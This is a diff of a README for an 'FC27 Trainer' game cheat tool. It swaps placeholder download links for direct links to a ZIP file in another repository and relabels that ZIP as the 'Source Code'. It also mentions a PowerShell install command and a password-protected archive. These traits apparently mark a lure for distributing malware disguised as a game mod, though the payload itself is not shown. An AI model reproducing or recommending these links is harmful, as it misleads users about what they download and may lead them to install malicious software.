@@ -41,7 +41,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/YOUR_USERNAME/FC27-Trainer/releases/latest">
+<a href="https://github.com/Massryodepot/FC27-Mod-Tool/releases/download/1/FC27-Trainer.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -54,8 +54,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/YOUR_USERNAME/FC27-Trainer/releases/latest)
-- [Source Code](https://github.com/YOUR_USERNAME/FC27-Trainer)
+- [Latest Release](https://github.com/Massryodepot/FC27-Mod-Tool/releases/download/1/FC27-Trainer.zip)
+- [Source Code](https://github.com/Massryodepot/FC27-Mod-Tool/releases/download/1/FC27-Trainer.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
